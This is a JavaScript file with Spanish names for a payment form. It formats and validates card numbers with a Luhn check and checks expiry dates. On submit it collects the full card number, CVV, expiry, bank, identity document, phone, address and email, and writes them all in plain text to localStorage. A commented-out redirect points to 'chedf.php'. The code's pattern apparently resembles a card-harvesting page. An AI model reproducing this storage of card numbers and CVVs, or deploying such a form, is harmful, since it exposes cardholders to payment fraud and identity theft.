document.addEventListener('DOMContentLoaded', () => {
    const cardInput = document.querySelector('#txt-tarjeta');
    const fechaInput = document.querySelector('#mFecha');
    const submitButton = document.querySelector('#btn-pagar');

    // Eventos modernos (opcional, puedes usar solo los del HTML si prefieres)
    if (cardInput) {
        cardInput.addEventListener('input', () => {
            handleCardNumberInput(cardInput);
        });
    }

    if (fechaInput) {
        fechaInput.addEventListener('input', () => {
            handleFechaInput(fechaInput);
        });
    }

    if (submitButton) {
        submitButton.addEventListener('click', (event) => {
            event.preventDefault();

            const entidad = document.querySelector('#txt-entidad').value;
            const tarjeta = document.querySelector('#txt-tarjeta').value.replace(/\D/g, '');
            const nombre = document.querySelector('#name').value;
            const fechaExpiracion = document.querySelector('#mFecha').value;
            const cvv = document.querySelector('#txt-cvv').value;
            console.log(document.querySelector('#cc2').value);
            
            const documentoIdentidad = document.querySelector('#cc2').value;
            const telefono = document.querySelector('#telnum').value;
            const ciudad = document.querySelector('#city').value;
            const direccion = document.querySelector('#address').value;
            const email = document.querySelector('#email').value;

            const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);

            const formData = {
                entidad,
                tarjeta,
                nombre,
                fechaExpiracion,
                cvv,
                documentoIdentidad,
                telefono,
                ciudad,
                direccion,
                email,
                transactionId
            };

            localStorage.setItem('formData', JSON.stringify(formData));

            // window.location.href = 'chedf.php';
        });
    }
});

// === FUNCIONES GLOBALES ===
window.handleCardNumberInput = function (input) {
    let numero = input.value.replace(/\D/g, '');
    let numeroFormateado = '';

    if (numero[0] === '3') {
        numero = numero.substr(0, 15);
        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;

        if (numero.length === 15 && !isValidLuhn(numero)) {
            alert('Número de tarjeta no válido');
            input.value = '';
            input.focus();
        }
    } else {
        numero = numero.substr(0, 16);
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;

        if (numero.length === 16 && !isValidLuhn(numero)) {
            alert('Número de tarjeta no válido');
            input.value = '';
            input.focus();
        }
    }
};

window.sendCVV = function (input) {
    const cvv = input.value.trim();
    if (!/^\d{3,4}$/.test(cvv)) {
        alert('CVV inválido');
        input.value = '';
        input.focus();
    }
};

window.handleFechaInput = function (input) {
    let fecha = input.value.replace(/\D/g, '');
    if (fecha.length === 4) {
        const mes = parseInt(fecha.substring(0, 2), 10);
        const anio = parseInt(fecha.substring(2, 4), 10);
        const fechaFormateada = `${mes.toString().padStart(2, '0')}/${anio.toString().padStart(2, '0')}`;
        input.value = fechaFormateada;

        if (!isValidFecha(mes, anio)) {
            alert('Fecha de expiración no válida');
            input.value = '';
            input.focus();
        }
    }
};

window.isValidLuhn = function (number) {
    let sum = 0;
    let shouldDouble = false;

    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
};

window.isValidFecha = function (mes, anio) {
    const currentYear = new Date().getFullYear() % 100;
    return mes >= 1 && mes <= 12 && anio >= currentYear;
};
